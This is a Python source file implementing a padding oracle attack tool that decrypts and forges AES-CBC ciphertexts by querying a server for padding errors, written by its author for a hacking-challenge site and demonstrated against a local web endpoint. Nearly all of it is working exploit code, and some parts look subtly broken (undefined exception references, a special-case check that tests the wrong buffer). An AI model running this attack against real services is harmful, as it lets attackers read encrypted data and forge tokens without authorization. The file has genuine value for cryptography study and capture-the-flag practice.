from sys import version, version_info
import base64
import re
import json
import requests
import random

##################################
'''
Author:  Les (L3st3r) Potter

A Class to Decrypt and Encrypt using a Padding Oracle

I wrote this originally to solve a challenge on a hacker website.
This is a tool to decrypt and encrypt messages using a
padding oracle.  A "padding oracle" is an algoithm or 
indicator that returns True if an encrypted buffer is
properly padded and False if it is not.

For this implementation, for a padding oracle to exist:
1.  The cipher must be a block cipher (like AES-128, others block ciphers may work)
2.  The cipher must use a PKCS#5 padding scheme (other paddings might work)
3.  The cipher must use the Cipher Block Chaining (CBC) mode.

For a padding oracle to be useful, it must operate in O(N).
This implementation makes up to 256 oracle requests per encrypted character

Refer to: https://robertheaton.com/2013/07/29/padding-oracle-attack/
for more information about padding oracles.  The article does
not describe how to do encryption using an oracle.  This implementation
does.
'''
##################################

class PaddingOracleCracker():

    class PaddingOracleException(Exception):
        m_message = None

        def Message(self): return self.m_message

        def __init__(self, message):
            self.m_message = message
            return super(PaddingOracleCracker.PaddingOracleException, self).__init__()


    class PaddingOracleUnimplementedException(PaddingOracleException): pass


    # self variables
    m_oracle = None
    m_blockSize = 16
    m_prepadding = 0

    @staticmethod
    def f_unimplementedOracle(x): raise PaddingOracleCracker.PaddingOracleUnimplementedException("unimplemented - user must implement oracle.  func(ct) returns True or False")

    def __init__(self, oracle = None, blocksize = 16):
        # The user must provide their own padding oracle function
        # The default oracle will always return false
        self.m_oracle = oracle if oracle else PaddingOracleCracker.f_unimplementedOracle
        self.m_blockSize = blocksize

    def Encrypt(self, ST):
        # If we feed a  BLOCKSIZE'ed random byte string (CT) to f_decrypt_pkcs(),
        # it will tell us the interim (I2) decrypted byte values based
        # on the unknown key.  It doesn't matter that the iterim is also
        # random, because it is the actual decrypted result for our chosen
        # random string.  The IV can be manipulated to make the make the
        # interim string be anything we like:
        #   Note:   I2 xor PT == IV, and
        #           I2 xor IV == PT
        #
        # So, we compute an IV from our desired PT and the I2 from decryption
        # above.  Then, CONCAT(IV,CT) will decrypt to PT.
        #
        # This process can be repeated on any random block, even the IV
        # that we just computed!!  We can make the IV itself decrypt
        # to any chosen PT as we did the initial CT above.  THEREFORE:
        #
        # To encrypt an arbitrary string based on an unknown key using
        # a padding oracle: 
        # 1.  Define the string (ST) to encrypt.
        # 2.  Pad it out according to PKCS#5 (PT)
        # 3.  Create an empty accumulator (CA)
        # 4.  Generate an arbitrary/random block (IV)
        # 5.  While there are more blocks in PT to encrypt...
        #       1. Push IV into front of the accumulator (CA.insert(0, IV))
        #       2. Set P to next (prior) block to encrypt
        #       3. Generate I2 from DECRYPTOR(IV)
        #       4. Compute new IV = I2 ^ P
        # 6.  Push IV into front of the accumulator
        # 7.  Return the concatenation of the accumulator
        PT = self.f_addPad(ST)
        CA = []
        IV = b''.join(self.f_genCPrime())
        while PT:
            CA.insert(0, IV)
            P = PT[-self.m_blockSize : ]
            PT = PT[ : -self.m_blockSize]
            I2 = self.f_decrypt_pkcs(IV)
            IV = PaddingOracleCracker.Xor(I2, P)
        CA.insert(0, IV)
        ret = b''.join(CA)
        return ret

    def Decrypt(self, CT, IV):
        # For each block in the encrypted string, decrypt with the
        # padding oracle.

        # split CT into blocks
        tmp = CT[:]
        CTList = []
        while tmp:
            CTList.append(tmp[ : self.m_blockSize])
            tmp = tmp[self.m_blockSize : ]

        # generate an IV List
        IVList = [IV]
        for iv in CTList[ : -1]:
            IVList.append(iv)

        # decrypt each block (C2) and xor with it's IV (i.e., C1)
        PT = b''
        PI = b''
        for C1, C2 in zip(IVList, CTList):
            I2 = self.f_decrypt_pkcs(C2)
            PT += PaddingOracleCracker.Xor(C1, I2)
            PI += I2

        # return the Plain Text string with padding removed and with padding retained
        return self.f_unPad(PT), PT

    def f_decrypt_pkcs(self, c2):
        # This is a decryptor specific to PKCS#5.
        # Valid padding is a character representing the amount of padding
        # repeated (padding count) times. for example:
        #
        #   xxxxxxxxxxxxxxx1
        #   xxxxxxxxxxxxxx22
        #   xxxxxxxxxxxxx333
        #   ...
        #   xfffffffffffffff
        #   FFFFFFFFFFFFFFFF
        #
        #   where F = 0x10
        #
        # There is always padding.  If a plain text string needs no
        # padding, the a full block of padding (last block in example)
        # is appended.
        # 
        # This internal decryptor expects a single self.m_blocksize string
        # to work on.
        
        c1prime = self.f_genCPrime()         # make up a random prior block
        i2 = [0] * self.m_blockSize   # initialize an empty interim block

        j = 1
        while j <= self.m_blockSize:
            offt = 16-j

            # prepare the c1prime for the next pass
            #  we use what we learned from previous passes to
            #  set the last PADDING-1 bytes of the buffer to 
            #  values that will decrypt to valid padding values.
            k = offt
            while k < self.m_blockSize - 1:
                c1prime[k+1] = bytes([i2[k+1] ^ j])
                k += 1

            # test every possible byte in the current position
            #   (if the padding oracle is 100% accurate this will
            #    succeed, if True is never returned, then the
            #    oracle does not exist or is not 100% accurate)
            found = False
            for i in range(256):
                c1prime[offt] = bytes([i])  # trial and error on the unknown position

                newcipherdata = b''.join(c1prime)          # add our test IV
                newcipherdata += c2       # add encrypted text

                # let the oracle decide
                if self.m_oracle(newcipherdata):
                    #test for a special case when j==1
                    if j == 1:
                        l = j + 1
                        lc1prime = c1prime[:]
                        while l <= 16:
                            lofft = 16 - l
                            oldval = lc1prime[lofft]
                            lc1prime[lofft] = bytes([lc1prime[lofft][0] ^ 1])
                            lnewcipherdata = b''.join(lc1prime)
                            lnewcipherdata += c2
                            if self.m_oracle(newcipherdata):
                                break; 
                            lc1prime[lofft] = bytes([lc1prime[lofft][0] ^ 1])
                            l += 1
                        m = j
                        while m < l:
                            mofft = 16-m
                            i2[mofft] = c1prime[mofft][0] ^ (l-1)
                            m += 1
                        j = l-1
                    else:
                        i2[offt] = i ^ j       
                    found = True
                    break
            if not found:
                raise PaddingOracleException("oracle failed")
            j += 1
            
        i2s = b''.join([bytes([c]) for c in i2])
        return i2s

    def f_genCPrime(self):
        # generate a BLOCKSIZE'd random array of bytes
        cp = []
        while len(cp) < self.m_blockSize:
            v = random.randrange(255)
            if not v:  continue
            cp.append(bytes([v]))
        return cp

    def f_addPad(self, s):
        ret = s[:]
        pad = len(ret) % self.m_blockSize
        pad = self.m_blockSize - pad
        padbuf = bytes([pad]*pad)
        return ret + padbuf

    def f_unPad(self, b):
        ret = b[:]
        pad = ret[-1]
        if pad <= 0 or pad > self.m_blockSize:
            raise PaddingOracleException("bad pad")

        padbuf = bytes([pad]*pad)
        res = ret[-pad:]
        if padbuf != res:
            raise PaddingOracleException("bad pad 2")

        return ret[:-pad]

    @classmethod
    def Xor(cls, a, b):
        x = b''
        for vca,vcb in zip(a,b):
            x += bytes([vca ^ vcb])
        return x

if __name__ == "__main__":
    url = 'http://127.0.0.1:8080/payload/%s'
    ses = requests.Session()

    def toWeb64(b):
        return str(base64.b64encode(b),'ascii').replace('=','~').replace('+','-').replace('/','!')

    def oracle(ct):
        newweb64 = toWeb64(ct)
        sendurl = url % newweb64
        req = ses.get(sendurl, headers={"Connection":"keep-alive"})
        res = req.content
        if req.status_code != 200:
            raise PaddingOracleCracker.PaddingOracleException("server error: " + repr(req.status_code))
        if not (b"adding is incorrect" in res):
            return True
        return False

    poc = PaddingOracleCracker(oracle)
    print(toWeb64(poc.Encrypt(b"a")))
    print(toWeb64(poc.Encrypt(b"ab")))
    print(toWeb64(poc.Encrypt(b"abc")))
    print(toWeb64(poc.Encrypt(b"abcd")))
    print(toWeb64(poc.Encrypt(b"abcde")))
    print(toWeb64(poc.Encrypt(b"abcdef")))
    print(toWeb64(poc.Encrypt(b"abcdefa")))
    print(toWeb64(poc.Encrypt(b"abcdefab")))
    print(toWeb64(poc.Encrypt(b"abcdefabc")))
    print(toWeb64(poc.Encrypt(b"abcdefabcd")))
    print(toWeb64(poc.Encrypt(b"abcdefabcde")))
    print(toWeb64(poc.Encrypt(b"abcdefabcdef")))